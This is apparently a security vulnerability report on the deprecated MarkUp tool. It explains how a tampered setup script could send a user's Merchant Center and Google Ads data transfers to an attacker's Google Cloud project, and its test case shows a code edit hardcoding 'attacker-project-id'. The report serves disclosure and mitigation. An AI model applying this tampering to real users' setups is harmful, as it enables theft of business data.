- Vulnerability Name: Data Redirection via Malicious Script Modification
- Description:
    1. An attacker socially engineers a user into downloading and running a modified version of the `setup.sh` script.
    2. The attacker modifies the `setup.sh` or `cloud_env_setup.py` script to replace the user's intended Google Cloud Project ID with an attacker-controlled Google Cloud Project ID. This modification can be done by directly editing the script or by providing a different project ID via command-line arguments if the script is modified to accept and prioritize external input over user-provided input in the original command.
    3. The user, unaware of the malicious modification, executes the altered `setup.sh` script, providing their Google Merchant Center ID and Google Ads Customer ID as prompted.
    4. The modified script proceeds with the installation process, but instead of configuring data transfers to the user's intended Google Cloud project, it configures them to the attacker's Google Cloud project.
    5. As a result, all Google Merchant Center and Google Ads data intended for the user's analysis are instead transferred to and stored within the attacker's Google Cloud project.
- Impact:
    - Confidentiality Breach: Sensitive Google Merchant Center and Google Ads data, including product information, sales performance, and advertising metrics, are exfiltrated to an attacker-controlled Google Cloud project.
    - Data Loss for the legitimate user: The user's data is not stored in their intended project, hindering their ability to analyze their own business data using the MarkUp tool.
    - Potential further malicious activities: The attacker can use the stolen data for competitive advantage, sell it to third parties, or use it to launch further attacks against the victim's business.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - Deprecation Notice: The `README.md` file clearly states that the tool is deprecated and points to a new, officially supported tool (`Shopping Insider`). This serves as a soft mitigation by discouraging new users from adopting MarkUp and encouraging existing users to migrate, thus reducing the potential attack surface over time.
    - Disclaimer: The `README.md` also includes a disclaimer stating "This is not an officially supported Google product.", which implicitly warns users about potential risks and lack of official support, suggesting they should use it at their own risk.
- Missing Mitigations:
    - Input Validation: The `setup.sh` and `cloud_env_setup.py` scripts lack validation of the project ID and other user inputs. There is no check to ensure the project ID format is correct or if the user has the necessary permissions for the specified project *before* proceeding with the setup.
    - Integrity Checks: There are no mechanisms to verify the integrity of the `setup.sh` or `cloud_env_setup.py` scripts before execution. This would involve techniques like cryptographic signatures to ensure the scripts haven't been tampered with since their original release.
    - Secure Distribution: The project is distributed via GitHub, which is a public platform. While GitHub itself is secure, there's no secure channel for users to verify they are downloading the legitimate tool from the intended source, making it easier for attackers to distribute modified versions.
    - User Awareness Training: No explicit warnings or guidelines within the project documentation to educate users about the social engineering risks associated with running scripts from public repositories and the importance of verifying the script's integrity.
- Preconditions:
    - User downloads the MarkUp tool from the public GitHub repository.
    - Attacker gains the ability to distribute a modified version of the MarkUp tool (e.g., via phishing, malicious websites, or compromised software repositories).
    - User is tricked into downloading and running the attacker's modified `setup.sh` script.
    - User has valid credentials and permissions for their Google Merchant Center and Google Ads accounts, and for *some* Google Cloud Project (attacker relies on user not carefully checking the project ID used during setup).
- Source Code Analysis:
    1. `setup.sh`: This script is the entry point for installation. It directly passes command-line arguments to `cloud_env_setup.py` without any sanitization or validation.
    ```bash
    python cloud_env_setup.py "$@"
    ```
    2. `cloud_env_setup.py`: This script uses `argparse` to parse arguments: `--project_id`, `--merchant_id`, `--ads_customer_id`, `--market_insights`.
    ```python
    parser = argparse.ArgumentParser()
    parser.add_argument('--project_id', help='GCP project id.', required=True)
    parser.add_argument(...)
    args = parser.parse_args()
    ads_customer_id = args.ads_customer_id.replace('-', '')
    data_transfer = cloud_data_transfer.CloudDataTransferUtils(args.project_id)
    ...
    merchant_center_config = data_transfer.create_merchant_center_transfer(
        args.merchant_id, args.dataset_id, args.market_insights)
    ads_config = data_transfer.create_google_ads_transfer(ads_customer_id,
                                                            args.dataset_id)
    ```
    The `args.project_id` is directly used to initialize `CloudDataTransferUtils` and is later used in methods like `create_merchant_center_transfer` and `create_google_ads_transfer` within `cloud_data_transfer.py`.
    3. `cloud_data_transfer.py`: The `__init__` method of `CloudDataTransferUtils` takes `project_id` as an argument and stores it as `self.project_id`. This `self.project_id` is used throughout the class when making API calls to create data transfers, including specifying the parent project for the transfer configurations.
    ```python
    class CloudDataTransferUtils(object):
      def __init__(self, project_id: str):
        self.project_id = project_id
        self.client = bigquery_datatransfer.DataTransferServiceClient()

      def create_merchant_center_transfer(...):
          ...
          parent = 'projects/' + self.project_id + '/locations/' + dataset_location
          request = bigquery_datatransfer.CreateTransferConfigRequest(
              parent=parent,
              transfer_config=input_config,
              authorization_code=authorization_code,
          )
          transfer_config = self.client.create_transfer_config(request)
          ...

      def create_google_ads_transfer(...):
          ...
          parent = 'projects/' + self.project_id + '/locations/' + dataset_location
          request = bigquery_datatransfer.CreateTransferConfigRequest(
              parent=parent,
              transfer_config=input_config,
              authorization_code=authorization_code,
          )
          transfer_config = self.client.create_transfer_config(request=request)
          ...
    ```
    The code directly uses the provided `project_id` without any validation to create data transfers. If an attacker can control this `project_id`, they can redirect the data transfer to their own project.
- Security Test Case:
    1. **Setup Attacker Environment:** Create a Google Cloud Project controlled by the attacker (attacker-project-id).
    2. **Modify `setup.sh`:**
        - Download the original `setup.sh` and `cloud_env_setup.py` scripts from the repository.
        - In `cloud_env_setup.py`, modify the `main` function to hardcode the project ID to the attacker's project ID (attacker-project-id), bypassing the command-line argument:
        ```python
        def main():
          args = parse_arguments()
          # Original line: data_transfer = cloud_data_transfer.CloudDataTransferUtils(args.project_id)
          # Modified line:
          data_transfer = cloud_data_transfer.CloudDataTransferUtils('attacker-project-id')
          ...
        ```
        - Alternatively, modify `setup.sh` to replace the project ID argument when calling `cloud_env_setup.py`.
    3. **Social Engineering:** Trick a test user into downloading and running this modified `setup.sh` script. This could be simulated by sending the modified script to a test user via email or hosting it on a website with instructions to install MarkUp.
    4. **User Execution:** The test user executes the modified `setup.sh` script, providing their *actual* Merchant Center ID, Google Ads Customer ID, and *their own* intended Google Cloud Project ID (victim-project-id) if prompted (though the modified script will ignore or override the project ID input).
    5. **Observe Data Transfer:**
        - **Attacker's Project (attacker-project-id):** Check the BigQuery dataset in the attacker's Google Cloud project. Data transfer datasets for Google Merchant Center and Google Ads, named according to the dataset ID specified in the script (default `markup`), should be created and populated with the victim's data.
        - **Victim's Project (victim-project-id):** Check the BigQuery dataset in the victim's intended Google Cloud project. No MarkUp datasets or data transfers will be created, or if they are created (due to other attempts), they will not contain the victim's Merchant Center and Ads data from the current test run.
    6. **Verification:** If the attacker's project receives the data and the victim's project does not, the vulnerability is confirmed.